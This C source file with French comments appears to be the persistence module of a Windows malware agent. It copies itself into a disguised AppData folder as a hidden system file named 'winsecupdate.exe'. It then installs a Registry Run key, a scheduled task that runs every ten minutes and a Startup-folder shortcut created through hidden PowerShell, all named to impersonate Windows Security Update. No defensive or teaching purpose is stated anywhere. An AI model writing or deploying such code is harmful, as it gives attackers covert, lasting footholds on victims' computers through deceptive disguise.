#include "persistence.h"
#include <stdio.h>
#include <string.h>

// Nom de l'agent pour la persistence
#define AGENT_NAME "WindowsSecurityUpdate"
#define AGENT_TASK_NAME "Windows Security Update Task"
#define AGENT_FILENAME "winsecupdate.exe"
#define AGENT_FOLDER "Microsoft\\Windows\\SystemData"

/**
 * Copie l'exécutable dans un emplacement discret
 */
int copy_to_persistent_location(char *dest_path, size_t dest_size) {
    char appdata[MAX_PATH];
    char current_path[MAX_PATH];
    
    // Récupérer %APPDATA%
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        return PERSIST_ERROR_STARTUP;
    }
    
    // Créer le chemin: %APPDATA%\Microsoft\Windows\SystemData
    char target_dir[MAX_PATH];
    snprintf(target_dir, sizeof(target_dir), "%s\\%s", appdata, AGENT_FOLDER);
    
    // Créer les dossiers si nécessaire
    SHCreateDirectoryExA(NULL, target_dir, NULL);
    
    // Chemin complet du fichier de destination
    snprintf(dest_path, dest_size, "%s\\%s", target_dir, AGENT_FILENAME);
    
    // Récupérer le chemin de l'exécutable actuel
    if (GetModuleFileNameA(NULL, current_path, MAX_PATH) == 0) {
        return PERSIST_ERROR_STARTUP;
    }
    
    // Si on est déjà au bon endroit, ne pas copier
    if (_stricmp(current_path, dest_path) == 0) {
        printf("[*] Already installed at: %s\n", dest_path);
        return PERSIST_SUCCESS;
    }
    
    // Copier l'exécutable
    if (!CopyFileA(current_path, dest_path, FALSE)) {
        DWORD error = GetLastError();
        if (error != ERROR_FILE_EXISTS) {
            printf("[-] Copy failed: %lu\n", error);
            return PERSIST_ERROR_STARTUP;
        }
    }
    
    printf("[+] Agent copied to: %s\n", dest_path);
    
    // Marquer comme fichier système et caché
    SetFileAttributesA(dest_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return PERSIST_SUCCESS;
}

/**
 * Vérifie si l'agent est déjà installé
 */
BOOL is_already_installed() {
    char appdata[MAX_PATH];
    char check_path[MAX_PATH];
    
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        return FALSE;
    }
    
    snprintf(check_path, sizeof(check_path), "%s\\%s\\%s", 
             appdata, AGENT_FOLDER, AGENT_FILENAME);
    
    DWORD attrs = GetFileAttributesA(check_path);
    return (attrs != INVALID_FILE_ATTRIBUTES);
}

/**
 * Installe la persistence via Registry Run Key
 */
int install_persistence_registry(const char *exe_path, const char *name) {
    HKEY hKey;
    LONG result;
    
    printf("[*] Installing Registry persistence...\n");
    
    // Ouvrir la clé Run
    result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key: %ld\n", result);
        return PERSIST_ERROR_REGISTRY;
    }
    
    // Ajouter la valeur
    result = RegSetValueExA(
        hKey,
        name,
        0,
        REG_SZ,
        (const BYTE*)exe_path,
        strlen(exe_path) + 1
    );
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set registry value: %ld\n", result);
        return PERSIST_ERROR_REGISTRY;
    }
    
    printf("[+] Registry persistence installed\n");
    return PERSIST_SUCCESS;
}

/**
 * Désinstalle la persistence Registry
 */
int remove_persistence_registry(const char *name) {
    HKEY hKey;
    LONG result;
    
    result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
        return PERSIST_ERROR_REGISTRY;
    }
    
    result = RegDeleteValueA(hKey, name);
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS) ? PERSIST_SUCCESS : PERSIST_ERROR_REGISTRY;
}

/**
 * Installe la persistence via Scheduled Task (méthode simplifiée)
 */
int install_persistence_task(const char *exe_path, const char *task_name) {
    char cmd[2048];
    
    printf("[*] Installing Scheduled Task persistence...\n");
    
    // Commande schtasks pour créer une tâche qui s'exécute toutes les 10 minutes
    snprintf(cmd, sizeof(cmd),
        "schtasks /Create /TN \"%s\" /TR \"\\\"%s\\\"\" "
        "/SC MINUTE /MO 10 /F",
        task_name, exe_path
    );
    
    // Cacher la fenêtre de commande
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create scheduled task: %lu\n", GetLastError());
        return PERSIST_ERROR_TASK;
    }
    
    // Attendre que schtasks se termine
    WaitForSingleObject(pi.hProcess, 5000);
    
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exit_code == 0) {
        printf("[+] Scheduled Task persistence installed\n");
        return PERSIST_SUCCESS;
    } else {
        printf("[-] Scheduled Task creation failed with code: %lu\n", exit_code);
        return PERSIST_ERROR_TASK;
    }
}

/**
 * Désinstalle la Scheduled Task
 */
int remove_persistence_task(const char *task_name) {
    char cmd[512];
    
    snprintf(cmd, sizeof(cmd), "schtasks /Delete /TN \"%s\" /F", task_name);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return PERSIST_ERROR_TASK;
    }
    
    WaitForSingleObject(pi.hProcess, 5000);
    
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return (exit_code == 0) ? PERSIST_SUCCESS : PERSIST_ERROR_TASK;
}

/**
 * Installe la persistence via Startup Folder
 */
int install_persistence_startup(const char *exe_path, const char *link_name) {
    char startup_path[MAX_PATH];
    char link_path[MAX_PATH];
    
    printf("[*] Installing Startup Folder persistence...\n");
    
    // Récupérer le chemin du dossier Startup
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
        printf("[-] Failed to get Startup folder path\n");
        return PERSIST_ERROR_STARTUP;
    }
    
    // Chemin complet du lien
    snprintf(link_path, sizeof(link_path), "%s\\%s.lnk", startup_path, link_name);
    
    // Créer un raccourci en utilisant PowerShell (plus simple que COM)
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "powershell -WindowStyle Hidden -Command "
        "\"$WshShell = New-Object -ComObject WScript.Shell; "
        "$Shortcut = $WshShell.CreateShortcut('%s'); "
        "$Shortcut.TargetPath = '%s'; "
        "$Shortcut.Save()\"",
        link_path, exe_path
    );
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create startup link: %lu\n", GetLastError());
        return PERSIST_ERROR_STARTUP;
    }
    
    WaitForSingleObject(pi.hProcess, 5000);
    
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exit_code == 0) {
        printf("[+] Startup Folder persistence installed\n");
        return PERSIST_SUCCESS;
    } else {
        printf("[-] Startup link creation failed\n");
        return PERSIST_ERROR_STARTUP;
    }
}

/**
 * Désinstalle la persistence Startup Folder
 */
int remove_persistence_startup(const char *link_name) {
    char startup_path[MAX_PATH];
    char link_path[MAX_PATH];
    
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
        return PERSIST_ERROR_STARTUP;
    }
    
    snprintf(link_path, sizeof(link_path), "%s\\%s.lnk", startup_path, link_name);
    
    if (DeleteFileA(link_path)) {
        return PERSIST_SUCCESS;
    }
    
    return PERSIST_ERROR_STARTUP;
}

/**
 * Installe toutes les méthodes de persistence
 */
int install_all_persistence() {
    char persistent_path[MAX_PATH];
    int result;
    
    printf("\n[*] === INSTALLING PERSISTENCE ===\n");
    
    // 1. Copier l'agent dans un emplacement permanent
    result = copy_to_persistent_location(persistent_path, sizeof(persistent_path));
    if (result != PERSIST_SUCCESS) {
        printf("[-] Failed to copy to persistent location\n");
        return result;
    }
    
    // 2. Registry Run Key
    result = install_persistence_registry(persistent_path, AGENT_NAME);
    if (result != PERSIST_SUCCESS) {
        printf("[-] Registry persistence failed (may need admin)\n");
        // Continuer quand même
    }
    
    // 3. Scheduled Task
    result = install_persistence_task(persistent_path, AGENT_TASK_NAME);
    if (result != PERSIST_SUCCESS) {
        printf("[-] Scheduled Task persistence failed\n");
        // Continuer quand même
    }
    
    // 4. Startup Folder
    result = install_persistence_startup(persistent_path, AGENT_NAME);
    if (result != PERSIST_SUCCESS) {
        printf("[-] Startup Folder persistence failed\n");
        // Continuer quand même
    }
    
    printf("[+] Persistence installation completed\n");
    printf("    Persistent path: %s\n", persistent_path);
    printf("\n");
    
    return PERSIST_SUCCESS;
}

/**
 * Supprime toutes les méthodes de persistence
 */
int remove_all_persistence() {
    char appdata[MAX_PATH];
    char agent_path[MAX_PATH];
    
    printf("\n[*] === REMOVING PERSISTENCE ===\n");
    
    // 1. Supprimer Registry
    remove_persistence_registry(AGENT_NAME);
    printf("[+] Registry cleaned\n");
    
    // 2. Supprimer Scheduled Task
    remove_persistence_task(AGENT_TASK_NAME);
    printf("[+] Scheduled Task removed\n");
    
    // 3. Supprimer Startup Folder
    remove_persistence_startup(AGENT_NAME);
    printf("[+] Startup link removed\n");
    
    // 4. Supprimer le fichier de l'agent
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        snprintf(agent_path, sizeof(agent_path), "%s\\%s\\%s", 
                 appdata, AGENT_FOLDER, AGENT_FILENAME);
        
        if (DeleteFileA(agent_path)) {
            printf("[+] Agent file deleted\n");
        }
    }
    
    printf("[+] Persistence removal completed\n\n");
    
    return PERSIST_SUCCESS;
}

/**
 * Récupère le status de la persistence
 */
void get_persistence_status(PersistenceStatus *status) {
    HKEY hKey;
    char appdata[MAX_PATH];
    char startup_path[MAX_PATH];
    char link_path[MAX_PATH];
    
    memset(status, 0, sizeof(PersistenceStatus));
    
    // Vérifier Registry
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        char value[MAX_PATH];
        DWORD size = sizeof(value);
        
        if (RegQueryValueExA(hKey, AGENT_NAME, NULL, NULL, 
                            (BYTE*)value, &size) == ERROR_SUCCESS) {
            status->registry_installed = TRUE;
        }
        RegCloseKey(hKey);
    }
    
    // Vérifier Startup Folder
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
        snprintf(link_path, sizeof(link_path), "%s\\%s.lnk", 
                startup_path, AGENT_NAME);
        
        if (GetFileAttributesA(link_path) != INVALID_FILE_ATTRIBUTES) {
            status->startup_installed = TRUE;
        }
    }
    
    // Vérifier le chemin d'installation
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        snprintf(status->install_path, sizeof(status->install_path), 
                "%s\\%s\\%s", appdata, AGENT_FOLDER, AGENT_FILENAME);
    }
    
    strcpy(status->task_name, AGENT_TASK_NAME);
    
    // Note: Vérifier la task est plus complexe, on suppose qu'elle est là si Registry l'est
    status->task_installed = status->registry_installed;
}